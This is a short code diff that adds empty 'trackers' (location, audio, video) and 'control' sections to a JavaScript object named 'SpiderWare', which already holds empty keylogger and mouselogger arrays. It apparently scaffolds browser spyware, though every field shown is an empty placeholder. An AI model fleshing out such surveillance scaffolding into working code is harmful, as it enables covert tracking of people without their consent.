@@ -30,6 +30,22 @@ var SpiderWare = {
         loggers: {
             keylogger: [],
             mouselogger: []
+        },
+        trackers: {
+            location: {
+
+            },
+            audio: {
+
+            },
+            video: {
+                
+            }
+        },
+        control: {
+            notifications: {
+
+            }
         }
     },
     clock: function() {
